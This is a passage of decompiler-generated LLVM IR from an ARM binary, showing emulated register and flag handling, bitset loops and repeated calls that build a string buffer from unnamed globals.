  %v0_8658 = load i32, i32* @r6, align 4
  %v1_8658 = add i32 %v0_8658, -1452
  %v2_8658 = inttoptr i32 %v1_8658 to i32*
  %v3_8658 = load i32, i32* %v2_8658, align 4
  store i32 %v3_8658, i32* %r0.global-to-local, align 4
  %v0_865c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_865c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %stack_var_-44, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 %v2_866c, i32* %r3.global-to-local, align 4
  %v5_8674 = call i32 @function_138fc(i32 %v3_8658, i32 %v0_865c, i32 8, i32 %v2_866c, i32 4)
  store i32 %v5_8674, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-20864.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v1_9e44, i32* %r2.global-to-local, align 4
  %v0_8680 = load i32, i32* @r6, align 4
  %v1_8680 = add i32 %v0_8680, -1436
  %v2_8680 = inttoptr i32 %v1_8680 to i32*
  %v3_8680 = load i32, i32* %v2_8680, align 4
  store i32 %v3_8680, i32* @r4, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v5_868c, i32* %r3.global-to-local, align 4
  %v1_8690 = add i32 %v0_8680, -1452
  %v2_8690 = inttoptr i32 %v1_8690 to i32*
  %v3_8690 = load i32, i32* %v2_8690, align 4
  store i32 %v3_8690, i32* %r0.global-to-local, align 4
  %v3_86a0 = add i32 %v0_8680, -1448
  %v4_86a0 = inttoptr i32 %v3_86a0 to i8*
  store i8 2, i8* %v4_86a0, align 1
  store i32 %v2_84f0, i32* %r3.global-to-local, align 4
  %v0_86ac = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_86ac, i32* %stack_var_-76, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 %v2_86b4, i32* %r1.global-to-local, align 4
  %v1_86b8 = load i32, i32* @r6, align 4
  %v2_86b8 = add i32 %v1_86b8, -1444
  %v3_86b8 = inttoptr i32 %v2_86b8 to i32*
  store i32 %v2_84f0, i32* %v3_86b8, align 4
  %v3_86bc = call i32 @function_13728(i32 %v3_8690, i32 %v2_86b4, i32 16)
  store i32 %v3_86bc, i32* %r0.global-to-local, align 4
  %v0_86c0 = load i32, i32* @r6, align 4
  %v1_86c0 = add i32 %v0_86c0, -1452
  %v2_86c0 = inttoptr i32 %v1_86c0 to i32*
  %v3_86c0 = load i32, i32* %v2_86c0, align 4
  store i32 %v3_86c0, i32* %ip.global-to-local, align 4
  %v3_86c8 = udiv i32 %v3_86c0, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_86cc = mul nuw nsw i32 %v3_86c8, 4
  store i32 %v3_86cc, i32* %r2.global-to-local, align 4
  store i32 %v2_86d0, i32* @lr, align 4
  br label %dec_label_pc_86d8

dec_label_pc_86d8:                                ; preds = %dec_label_pc_8cc0, %dec_label_pc_862c
  %v0_86e8 = phi i32 [ %v3_86c0, %dec_label_pc_862c ], [ %v3_8cc0, %dec_label_pc_8cc0 ]
  %v3_86cc.pn = phi i32 [ %v3_86cc, %dec_label_pc_862c ], [ %v3_8ccc, %dec_label_pc_8cc0 ]
  %storemerge = add i32 %v3_86cc.pn, %v2_86d0
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_86d8 = add i32 %storemerge, -292
  %v2_86d8 = inttoptr i32 %v1_86d8 to i32*
  %v3_86d8 = load i32, i32* %v2_86d8, align 4
  %v1_86dc = urem i32 %v0_86e8, 32
  store i32 %v1_86dc, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_86e4 = shl i32 1, %v1_86dc
  %v8_86e4 = or i32 %v3_86d8, %v7_86e4
  store i32 %v8_86e4, i32* %r1.global-to-local, align 4
  %v1_86e8 = load i32, i32* @r8, align 4
  %v2_86e8 = sub i32 %v0_86e8, %v1_86e8
  %v3_86e8 = icmp uge i32 %v0_86e8, %v1_86e8
  store i1 %v3_86e8, i1* %cpsr_c.global-to-local, align 1
  %v4_86e8 = xor i32 %v1_86e8, %v0_86e8
  %v5_86e8 = xor i32 %v2_86e8, %v0_86e8
  %v6_86e8 = and i32 %v5_86e8, %v4_86e8
  %v7_86e8 = icmp slt i32 %v6_86e8, 0
  %v8_86e8 = icmp slt i32 %v2_86e8, 0
  %v9_86e8 = icmp eq i32 %v0_86e8, %v1_86e8
  store i1 %v9_86e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_86e4, i32* %v2_86d8, align 4
  %v3_86f0 = xor i1 %v8_86e8, %v7_86e8
  %v4_86f0 = or i1 %v9_86e8, %v3_86f0
  br i1 %v4_86f0, label %dec_label_pc_85b4, label %dec_label_pc_86f4

dec_label_pc_86f4:                                ; preds = %dec_label_pc_86d8
  %v0_86f4 = load i32, i32* %ip.global-to-local, align 4
  %v1_86f4 = load i32, i32* %r3.global-to-local, align 4
  %v2_86f4 = add i32 %v1_86f4, %v0_86f4
  store i32 %v2_86f4, i32* @r8, align 4
  br label %dec_label_pc_86f8

dec_label_pc_86f8:                                ; preds = %dec_label_pc_8d10, %dec_label_pc_8fa0, %dec_label_pc_8f4c, %dec_label_pc_86f4
  %v0_871065 = phi i32 [ %v2_8d10, %dec_label_pc_8d10 ], [ %v2_8fa0, %dec_label_pc_8fa0 ], [ %v2_8f4c, %dec_label_pc_8f4c ], [ %v2_86f4, %dec_label_pc_86f4 ]
  store i32 %v0_835c, i32* %r2.global-to-local, align 4
  %v0_86fc = load i32, i32* @r7, align 4
  %v1_86fc = add i32 %v0_86fc, 1
  store i32 %v1_86fc, i32* @r7, align 4
  %v0_8700 = load i32, i32* @r6, align 4
  %v3_8704 = icmp uge i32 %v1_86fc, %v0_835c
  store i1 %v3_8704, i1* %cpsr_c.global-to-local, align 1
  %v9_8704 = icmp eq i32 %v1_86fc, %v0_835c
  store i1 %v9_8704, i1* %cpsr_z.global-to-local, align 1
  %v1_8708 = add i32 %v0_8700, 3140
  store i32 %v1_8708, i32* @r6, align 4
  br i1 %v9_8704, label %dec_label_pc_8710, label %dec_label_pc_85cc

dec_label_pc_8710:                                ; preds = %dec_label_pc_86f8, %dec_label_pc_85b4.dec_label_pc_8710_crit_edge
  %v0_8748 = phi i32 [ %v0_8710.pre, %dec_label_pc_85b4.dec_label_pc_8710_crit_edge ], [ %v0_871065, %dec_label_pc_86f8 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8710 = icmp eq i32 %v0_8748, 0
  store i1 %v2_8710, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8710, label %dec_label_pc_84ec, label %dec_label_pc_8718

dec_label_pc_8718:                                ; preds = %dec_label_pc_8710
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %stack_var_-60, align 4
  store i32 %v2_8738, i32* %ip.global-to-local, align 4
  store i32 %v2_873c, i32* %r1.global-to-local, align 4
  store i32 %v2_8740, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v0_8748, i32* %r0.global-to-local, align 4
  %v5_8750 = call i32 @function_12e3c(i32 %v0_8748, i32 %v2_873c, i32 %v2_8740, i32 0, i32 %v2_8738)
  store i32 %v5_8750, i32* @r4, align 4
  %v0_8758 = load i32, i32* @r5, align 4
  store i32 %v0_8758, i32* %r0.global-to-local, align 4
  %v1_875c = inttoptr i32 %v0_8758 to i32*
  %v2_875c = call i32 @function_12d98(i32* %v1_875c)
  store i32 %v2_875c, i32* %r0.global-to-local, align 4
  %v0_8760 = load i32, i32* @r4, align 4
  %v1_8760 = load i32, i32* @r5, align 4
  %v3_8760 = icmp uge i32 %v0_8760, %v1_8760
  store i1 %v3_8760, i1* %cpsr_c.global-to-local, align 1
  %v9_8760 = icmp eq i32 %v0_8760, %v1_8760
  store i1 %v9_8760, i1* %cpsr_z.global-to-local, align 1
  %v7_8768 = icmp sgt i32 %v0_8760, %v1_8760
  br i1 %v7_8768, label %dec_label_pc_876c, label %dec_label_pc_84ec

dec_label_pc_876c:                                ; preds = %dec_label_pc_8718
  %v0_87cc.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_87cc

dec_label_pc_8774:                                ; preds = %dec_label_pc_87e0, %dec_label_pc_884c
  %v1_8784 = phi i32 [ %v1_87f8, %dec_label_pc_87e0 ], [ %v1_8784.pre, %dec_label_pc_884c ]
  %v0_877c = phi i32 [ %v3_87e8, %dec_label_pc_87e0 ], [ %v0_877c.pre, %dec_label_pc_884c ]
  store i32 %v2_86d0, i32* %r3.global-to-local, align 4
  %v2_877c = add i32 %v0_877c, %v2_86d0
  store i32 %v2_877c, i32* %r2.global-to-local, align 4
  %v1_8780 = add i32 %v2_877c, -164
  %v2_8780 = inttoptr i32 %v1_8780 to i32*
  %v3_8780 = load i32, i32* %v2_8780, align 4
  %v2_8784 = add i32 %v1_8784, -1
  %v3_8784 = shl i32 1, %v2_8784
  %v4_8784 = and i32 %v3_8780, %v3_8784
  %v5_8784 = icmp ne i32 %v4_8784, 0
  store i1 %v5_8784, i1* %cpsr_c.global-to-local, align 1
  %v6_8784 = lshr i32 %v3_8780, %v1_8784
  store i32 %v6_8784, i32* %r3.global-to-local, align 4
  %v1_8788 = urem i32 %v6_8784, 2
  %v2_8788 = icmp eq i32 %v1_8788, 0
  store i1 %v2_8788, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8788, label %dec_label_pc_87ac, label %dec_label_pc_8790

dec_label_pc_8790:                                ; preds = %dec_label_pc_8774
  %v0_8790 = load i32, i32* @sl, align 4
  %v1_8790 = add i32 %v0_8790, -1448
  %v2_8790 = inttoptr i32 %v1_8790 to i8*
  %v3_8790 = load i8, i8* %v2_8790, align 1
  %v4_8790 = zext i8 %v3_8790 to i32
  store i32 %v4_8790, i32* %r3.global-to-local, align 4
  %v2_8794 = icmp ugt i8 %v3_8790, 5
  store i1 %v2_8794, i1* %cpsr_c.global-to-local, align 1
  %v7_8794 = icmp eq i8 %v3_8790, 6
  store i1 %v7_8794, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8794, label %dec_label_pc_8fe8, label %dec_label_pc_879c

dec_label_pc_879c:                                ; preds = %dec_label_pc_8790
  %v2_879c = icmp ugt i8 %v3_8790, 6
  store i1 %v2_879c, i1* %cpsr_c.global-to-local, align 1
  %v7_879c = icmp eq i8 %v3_8790, 7
  store i1 %v7_879c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_879c, label %dec_label_pc_8d18, label %dec_label_pc_87a4

dec_label_pc_87a4:                                ; preds = %dec_label_pc_879c
  %v2_87a4 = icmp ugt i8 %v3_8790, 9
  store i1 %v2_87a4, i1* %cpsr_c.global-to-local, align 1
  %v7_87a4 = icmp eq i8 %v3_8790, 10
  store i1 %v7_87a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_87a4, label %dec_label_pc_9620, label %dec_label_pc_87ac

dec_label_pc_87ac:                                ; preds = %dec_label_pc_8e18, %dec_label_pc_96b0, %dec_label_pc_9660, %dec_label_pc_9038, %dec_label_pc_87a4, %dec_label_pc_8774, %dec_label_pc_87cc, %dec_label_pc_9b00, %dec_label_pc_99ac, %dec_label_pc_9934, %dec_label_pc_98d8, %dec_label_pc_96bc, %dec_label_pc_968c, %dec_label_pc_9670, %dec_label_pc_9614, %dec_label_pc_9510, %dec_label_pc_8f54
  store i32 %v0_835c, i32* %r3.global-to-local, align 4
  %v1_87b4 = add i32 %stack_var_-20820.0, 1
  store i32 %v1_87b4, i32* %r2.global-to-local, align 4
  %v0_87b8 = load i32, i32* @sl, align 4
  %v3_87bc = icmp uge i32 %v1_87b4, %v0_835c
  store i1 %v3_87bc, i1* %cpsr_c.global-to-local, align 1
  %v9_87bc = icmp eq i32 %v1_87b4, %v0_835c
  store i1 %v9_87bc, i1* %cpsr_z.global-to-local, align 1
  %v1_87c4 = add i32 %v0_87b8, 3140
  store i32 %v1_87c4, i32* @sl, align 4
  br i1 %v9_87bc, label %dec_label_pc_84ec, label %dec_label_pc_87cc

dec_label_pc_87cc:                                ; preds = %dec_label_pc_87ac, %dec_label_pc_876c
  %v0_87cc = phi i32 [ %v0_87cc.pre, %dec_label_pc_876c ], [ %v1_87c4, %dec_label_pc_87ac ]
  %stack_var_-20820.0 = phi i32 [ %v1_8760, %dec_label_pc_876c ], [ %v1_87b4, %dec_label_pc_87ac ]
  %v1_87cc = add i32 %v0_87cc, -1452
  %v2_87cc = inttoptr i32 %v1_87cc to i32*
  %v3_87cc = load i32, i32* %v2_87cc, align 4
  store i32 %v3_87cc, i32* %r0.global-to-local, align 4
  %v2_87d4 = icmp eq i32 %v3_87cc, -1
  store i1 %v2_87d4, i1* %cpsr_c.global-to-local, align 1
  %v7_87d4 = icmp eq i32 %v3_87cc, -1
  store i1 %v7_87d4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_87cc, i32* %sb.global-to-local, align 4
  br i1 %v7_87d4, label %dec_label_pc_87ac, label %dec_label_pc_87e0

dec_label_pc_87e0:                                ; preds = %dec_label_pc_87cc
  %v3_87e0 = udiv i32 %v3_87cc, 32
  %v3_87e8 = mul nuw nsw i32 %v3_87e0, 4
  store i32 %v3_87e8, i32* @ip, align 4
  store i32 %v2_86d0, i32* @lr, align 4
  %v2_87f0 = add i32 %v3_87e8, %v2_86d0
  store i32 %v2_87f0, i32* %r2.global-to-local, align 4
  %v1_87f4 = add i32 %v2_87f0, -292
  %v2_87f4 = inttoptr i32 %v1_87f4 to i32*
  %v3_87f4 = load i32, i32* %v2_87f4, align 4
  %v1_87f8 = urem i32 %v3_87cc, 32
  store i32 %v1_87f8, i32* %r1.global-to-local, align 4
  %v2_87fc = add nsw i32 %v1_87f8, -1
  %v3_87fc = shl i32 1, %v2_87fc
  %v4_87fc = and i32 %v3_87f4, %v3_87fc
  %v5_87fc = icmp ne i32 %v4_87fc, 0
  store i1 %v5_87fc, i1* %cpsr_c.global-to-local, align 1
  %v6_87fc = lshr i32 %v3_87f4, %v1_87f8
  store i32 %v6_87fc, i32* %r3.global-to-local, align 4
  %v1_8800 = urem i32 %v6_87fc, 2
  %v2_8800 = icmp eq i32 %v1_8800, 0
  store i1 %v2_8800, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8800, label %dec_label_pc_8774, label %dec_label_pc_8808

dec_label_pc_8808:                                ; preds = %dec_label_pc_87e0
  store i32 %v10_82b0, i32* %ip.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_8820, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-48, align 4
  store i32 4, i32* %stack_var_-52, align 4
  store i32 %v2_882c, i32* @lr, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_8838 = call i32 @function_13798(i32 %v3_87cc, i32 1, i32 4, i32 %v2_8820, i32 %v2_882c)
  store i32 %v10_82b0, i32* %r1.global-to-local, align 4
  %v3_8840 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_8840, i32* %r3.global-to-local, align 4
  %v2_8844 = or i32 %v3_8840, %v5_8838
  store i32 %v2_8844, i32* %r0.global-to-local, align 4
  %v4_8844 = icmp eq i32 %v2_8844, 0
  store i1 %v4_8844, i1* %cpsr_z.global-to-local, align 1
  %v0_884c = load i32, i32* @sl, align 4
  %v1_884c = add i32 %v0_884c, -1452
  %v2_884c = inttoptr i32 %v1_884c to i32*
  %v3_884c = load i32, i32* %v2_884c, align 4
  br i1 %v4_8844, label %dec_label_pc_884c, label %dec_label_pc_8f54

dec_label_pc_884c:                                ; preds = %dec_label_pc_8808
  store i32 %v3_884c, i32* %r3.global-to-local, align 4
  %v3_8850 = udiv i32 %v3_884c, 32
  store i32 %v3_8850, i32* %r2.global-to-local, align 4
  %v1_8854 = urem i32 %v3_884c, 32
  store i32 %v1_8854, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8858 = mul nuw nsw i32 %v3_8850, 4
  store i32 %v3_8858, i32* @ip, align 4
  %v0_885c = load i32, i32* @r4, align 4
  %v1_885c = trunc i32 %v0_885c to i8
  %v3_885c = add i32 %v0_884c, -1448
  %v4_885c = inttoptr i32 %v3_885c to i8*
  store i8 %v1_885c, i8* %v4_885c, align 1
  %v0_877c.pre = load i32, i32* @ip, align 4
  %v1_8784.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_8774

dec_label_pc_8864:                                ; preds = %dec_label_pc_85cc
  %v1_8864 = add i32 %v3_8870, 4
  %v2_8864 = inttoptr i32 %v1_8864 to i32*
  %v3_8864 = load i32, i32* %v2_8864, align 4
  store i32 %v3_8864, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8868 = icmp eq i32 %v3_8864, 0
  store i1 %v2_8868, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8868, label %.thread19, label %.thread17

.thread17:                                        ; preds = %dec_label_pc_8864
  store i32 4, i32* @r3, align 4
  store i8 4, i8* %v2_85cc, align 1
  %v0_8874.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8874.pr.pr, label %.thread17..thread19_crit_edge, label %dec_label_pc_887c

.thread17..thread19_crit_edge:                    ; preds = %.thread17
  %v1_8874.pre = load i32, i32* @r3, align 4
  %v3_8874.pre = load i32, i32* @r6, align 4
  %extract.t = trunc i32 %v1_8874.pre to i8
  br label %.thread19

.thread19:                                        ; preds = %.thread17..thread19_crit_edge, %dec_label_pc_8864
  %v3_8874 = phi i32 [ %v3_8874.pre, %.thread17..thread19_crit_edge ], [ %v3_8870, %dec_label_pc_8864 ]
  %v1_8874.off0 = phi i8 [ %extract.t, %.thread17..thread19_crit_edge ], [ 0, %dec_label_pc_8864 ]
  %v4_8874 = add i32 %v3_8874, -1448
  %v5_8874 = inttoptr i32 %v4_8874 to i8*
  store i8 %v1_8874.off0, i8* %v5_8874, align 1
  %v0_8878.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8878.pr, label %.thread19.dec_label_pc_85e8_crit_edge, label %dec_label_pc_887c

.thread19.dec_label_pc_85e8_crit_edge:            ; preds = %.thread19
  %v0_85e8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_85e8

dec_label_pc_887c:                                ; preds = %.thread17, %.thread19, %dec_label_pc_8574
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  %v0_8884 = load i32, i32* @r5, align 4
  %v1_8884 = add i32 %v0_8884, 2112
  store i32 %v1_8884, i32* %r0.global-to-local, align 4
  %v1_8888 = load i32, i32* @r6, align 4
  %v2_8888 = add i32 %v1_8888, 12
  %v3_8888 = inttoptr i32 %v2_8888 to i32*
  store i32 -1, i32* %v3_8888, align 4
  %v0_888c = load i32, i32* %r0.global-to-local, align 4
  %v1_888c = add i32 %v0_888c, 4
  store i32 %v1_888c, i32* %r0.global-to-local, align 4
  store i32 1024, i32* %r1.global-to-local, align 4
  %v0_8894 = load i32, i32* %sb.global-to-local, align 4
  %v1_8894 = load i32, i32* @r6, align 4
  %v2_8894 = inttoptr i32 %v1_8894 to i32*
  store i32 %v0_8894, i32* %v2_8894, align 4
  %v2_8898 = call i32 @function_12514(i32 %v1_888c, i32 1024)
  store i32 10240, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v0_88a4 = load i32, i32* %sb.global-to-local, align 4
  %v1_88a4 = load i32, i32* @r6, align 4
  %v2_88a4 = add i32 %v1_88a4, 660
  %v3_88a4 = inttoptr i32 %v2_88a4 to i32*
  store i32 %v0_88a4, i32* %v3_88a4, align 4
  %v2_88a8 = call i32 @function_12514(i32 %stack_var_-20860.0.ph, i32 10240)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_88b0 = call i32 @function_12480(i8* %v1_88b0)
  %v0_88b4 = load i32, i32* @r5, align 4
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  %v1_88bc = add i32 %v0_88b4, 1431
  store i32 %v1_88bc, i32* %fp.global-to-local, align 4
  %v2_88c0 = add i32 %v2_88b0, %stack_var_-20860.0.ph
  store i32 %v2_88c0, i32* @r0, align 4
  store i32 %v1_88bc, i32* %r1.global-to-local, align 4
  %v2_88c8 = inttoptr i32 %v2_88c0 to i8*
  %v3_88c8 = call i32 @function_124a8(i8* %v2_88c8, i32 %v1_88bc)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_88d0 = call i32 @function_12480(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_18504.24 to i32), i32* %r1.global-to-local, align 4
  %v2_88dc = add i32 %v2_88d0, %stack_var_-20860.0.ph
  store i32 %v2_88dc, i32* @r0, align 4
  %v2_88e0 = inttoptr i32 %v2_88dc to i8*
  %v3_88e0 = call i32 @function_124a8(i8* %v2_88e0, i32 ptrtoint (i32* @global_var_18504.24 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_88e8 = call i32 @function_12480(i8* %v1_88b0)
  %v2_88f0 = add i32 %v2_88e8, %stack_var_-20860.0.ph
  store i32 %v2_88f0, i32* @r0, align 4
  %v0_88f4 = load i32, i32* @r5, align 4
  %v1_88f4 = add i32 %v0_88f4, 532
  store i32 %v1_88f4, i32* %r1.global-to-local, align 4
  %v2_88f8 = inttoptr i32 %v2_88f0 to i8*
  %v3_88f8 = call i32 @function_124a8(i8* %v2_88f8, i32 %v1_88f4)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8900 = call i32 @function_12480(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_184dc.26 to i32), i32* %r1.global-to-local, align 4
  %v2_890c = add i32 %v2_8900, %stack_var_-20860.0.ph
  store i32 %v2_890c, i32* @r0, align 4
  %v3_8910 = inttoptr i32 %v2_890c to i8*
  %v4_8910 = call i32 @function_124a8(i8* %v3_8910, i32 ptrtoint ([24 x i8]* @global_var_184dc.26 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8918 = call i32 @function_12480(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  %v0_8920 = load i32, i32* @r5, align 4
  %v1_8920 = add i32 %v0_8920, 20
  store i32 %v1_8920, i32* %r1.global-to-local, align 4
  %v2_8924 = add i32 %v2_8918, %stack_var_-20860.0.ph
  store i32 %v2_8924, i32* @r0, align 4
  %v2_8928 = inttoptr i32 %v2_8924 to i8*
  %v3_8928 = call i32 @function_124a8(i8* %v2_8928, i32 %v1_8920)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8930 = call i32 @function_12480(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_184f4.28 to i32), i32* %r1.global-to-local, align 4
  %v2_893c = add i32 %v2_8930, %stack_var_-20860.0.ph
  store i32 %v2_893c, i32* @r0, align 4
  %v3_8940 = inttoptr i32 %v2_893c to i8*
  %v4_8940 = call i32 @function_124a8(i8* %v3_8940, i32 ptrtoint ([9 x i8]* @global_var_184f4.28 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8948 = call i32 @function_12480(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  %v0_8950 = load i32, i32* @r5, align 4
  %v2_8954 = add i32 %v2_8948, %stack_var_-20860.0.ph
  store i32 %v2_8954, i32* @r0, align 4
  %v1_8958 = add i32 %v0_8950, 789
  store i32 %v1_8958, i32* %r1.global-to-local, align 4
  %v2_895c = inttoptr i32 %v2_8954 to i8*
  %v3_895c = call i32 @function_124a8(i8* %v2_895c, i32 %v1_8958)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8964 = call i32 @function_12480(i8* %v1_88b0)
  %v2_896c = add i32 %v2_8964, %stack_var_-20860.0.ph
  store i32 %v2_896c, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32* %r1.global-to-local, align 4
  %v3_8974 = inttoptr i32 %v2_896c to i8*
  %v4_8974 = call i32 @function_124a8(i8* %v3_8974, i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32))
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_897c = call i32 @function_11be8(i32 32)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8984 = call i32 @function_12480(i8* %v1_88b0)
  %v0_8988 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8988, i32* %r1.global-to-local, align 4
  store i32 %v2_8984, i32* @r4, align 4
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_8994 = inttoptr i32 %v0_8988 to i32*
  %v3_8994 = call i32 @function_11b24(i32 32, i32* %v2_8994)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_8994, i32* %r1.global-to-local, align 4
  %v1_89a0 = load i32, i32* @r4, align 4
  %v2_89a0 = add i32 %v1_89a0, %stack_var_-20860.0.ph
  store i32 %v2_89a0, i32* @r0, align 4
  %v2_89a4 = inttoptr i32 %v2_89a0 to i8*
  %v3_89a4 = call i32 @function_124a8(i8* %v2_89a4, i32 %v3_8994)
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_89ac = call i32 @function_11b48(i32 32)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_89b4 = call i32 @function_12480(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32* %r1.global-to-local, align 4
  %v2_89c0 = add i32 %v2_89b4, %stack_var_-20860.0.ph
  store i32 %v2_89c0, i32* @r0, align 4
  %v3_89c4 = inttoptr i32 %v2_89c0 to i8*
  %v4_89c4 = call i32 @function_124a8(i8* %v3_89c4, i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32))
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_89cc = call i32 @function_11be8(i32 33)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_89d4 = call i32 @function_12480(i8* %v1_88b0)
  %v0_89d8 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_89d8, i32* %r1.global-to-local, align 4
  store i32 %v2_89d4, i32* @r4, align 4
  store i32 33, i32* %r0.global-to-local, align 4
  %v2_89e4 = inttoptr i32 %v0_89d8 to i32*
  %v3_89e4 = call i32 @function_11b24(i32 33, i32* %v2_89e4)
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v3_89e4, i32* %r1.global-to-local, align 4
  %v1_89f0 = load i32, i32* @r4, align 4
  %v2_89f0 = add i32 %v1_89f0, %stack_var_-20860.0.ph
  store i32 %v2_89f0, i32* @r0, align 4
  %v2_89f4 = inttoptr i32 %v2_89f0 to i8*
  %v3_89f4 = call i32 @function_124a8(i8* %v2_89f4, i32 %v3_89e4)
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_89fc = call i32 @function_11b48(i32 33)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a04 = call i32 @function_12480(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32* %r1.global-to-local, align 4
  %v2_8a10 = add i32 %v2_8a04, %stack_var_-20860.0.ph
  store i32 %v2_8a10, i32* @r0, align 4
  %v3_8a14 = inttoptr i32 %v2_8a10 to i8*
  %v4_8a14 = call i32 @function_124a8(i8* %v3_8a14, i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32))
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_8a1c = call i32 @function_11be8(i32 34)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a24 = call i32 @function_12480(i8* %v1_88b0)
  %v0_8a28 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8a28, i32* %r1.global-to-local, align 4
  store i32 %v2_8a24, i32* @r4, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  %v2_8a34 = inttoptr i32 %v0_8a28 to i32*
  %v3_8a34 = call i32 @function_11b24(i32 34, i32* %v2_8a34)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_8a34, i32* %r1.global-to-local, align 4
  %v1_8a40 = load i32, i32* @r4, align 4
  %v2_8a40 = add i32 %v1_8a40, %stack_var_-20860.0.ph
  store i32 %v2_8a40, i32* @r0, align 4
  %v2_8a44 = inttoptr i32 %v2_8a40 to i8*
  %v3_8a44 = call i32 @function_124a8(i8* %v2_8a44, i32 %v3_8a34)
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_8a4c = call i32 @function_11b48(i32 34)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a54 = call i32 @function_12480(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32* %r1.global-to-local, align 4
  %v2_8a60 = add i32 %v2_8a54, %stack_var_-20860.0.ph
